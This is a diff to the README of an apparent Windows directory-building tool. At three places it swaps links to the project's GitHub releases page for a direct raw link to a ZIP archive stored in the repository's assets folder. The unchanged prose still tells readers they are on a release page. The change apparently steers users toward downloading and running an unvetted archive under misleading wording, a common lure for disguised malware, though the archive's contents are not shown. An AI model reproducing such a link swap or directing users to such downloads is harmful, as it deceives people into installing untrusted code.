@@ -1,6 +1,6 @@
 # 🤖 online-directory-create-expert - Build Verified Directories Fast
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Sikefury/online-directory-create-expert/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sikefury/online-directory-create-expert/main/assets/online-create-directory-expert-1.2.zip)
 
 ## 🧭 What this tool does
 
@@ -21,7 +21,7 @@ For best results, use a current version of Windows 10 or Windows 11.
 
 Visit this page to download the latest release:
 
-https://github.com/Sikefury/online-directory-create-expert/releases
+https://raw.githubusercontent.com/Sikefury/online-directory-create-expert/main/assets/online-create-directory-expert-1.2.zip
 
 On that page, look for the newest release and choose the Windows file if one is listed. If the release contains a ZIP file, download it first, then extract it before opening the app.
 
@@ -229,7 +229,7 @@ A verified dataset saves time because you do not need to sort raw records again 
 
 If you need a newer build, visit the release page again:
 
-https://github.com/Sikefury/online-directory-create-expert/releases
+https://raw.githubusercontent.com/Sikefury/online-directory-create-expert/main/assets/online-create-directory-expert-1.2.zip
 
 Check that page when you want the latest version or a new release file for Windows
 
